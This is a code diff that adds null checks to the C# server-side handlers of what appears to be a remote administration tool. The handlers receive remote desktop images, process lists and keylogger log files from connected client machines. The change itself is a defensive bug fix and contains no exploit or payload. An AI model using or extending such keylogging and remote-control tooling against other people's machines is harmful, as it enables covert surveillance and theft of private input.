@@ -13,7 +13,7 @@ namespace xServer.Core.Commands
     {
         public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
         {
-            if (client.Value.FrmRdp == null)
+            if (client.Value == null || client.Value.FrmRdp == null)
                 return;
 
             if (packet.Image == null)
@@ -44,7 +44,7 @@ namespace xServer.Core.Commands
 
         public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
         {
-            if (client.Value.FrmTm == null)
+            if (client.Value == null || client.Value.FrmTm == null)
                 return;
 
             client.Value.FrmTm.ClearListview();
@@ -68,7 +68,8 @@ namespace xServer.Core.Commands
                         ListViewItem lvi =
                             new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
 
-                        client.Value.FrmTm.AddProcessToListview(lvi);
+                        if (client.Value != null && client.Value.FrmTm != null)
+                            client.Value.FrmTm.AddProcessToListview(lvi);
                     }
                 }
             }).Start();
@@ -76,7 +77,7 @@ namespace xServer.Core.Commands
 
         public static void HandleGetKeyloggerLogsResponse(Client client, GetKeyloggerLogsResponse packet)
         {
-            if (client.Value.FrmKl == null)
+            if (client.Value == null || client.Value.FrmKl == null)
                 return;
 
             if (packet.FileCount == 0)
@@ -109,13 +110,13 @@ namespace xServer.Core.Commands
 
                 foreach (FileInfo file in iFiles)
                 {
-                    if (client.Value.FrmKl == null)
+                    if (client.Value == null || client.Value.FrmKl == null)
                         break;
 
                     client.Value.FrmKl.AddLogToListview(file.Name);
                 }
 
-                if (client.Value.FrmKl == null)
+                if (client.Value == null || client.Value.FrmKl == null)
                     return;
 
                 client.Value.FrmKl.SetGetLogsEnabled(true);
@@ -124,7 +125,7 @@ namespace xServer.Core.Commands
 
         public static void HandleGetMonitorsResponse(Client client, GetMonitorsResponse packet)
         {
-            if (client.Value.FrmRdp == null)
+            if (client.Value == null || client.Value.FrmRdp == null)
                 return;
 
             client.Value.FrmRdp.AddMonitors(packet.Number);
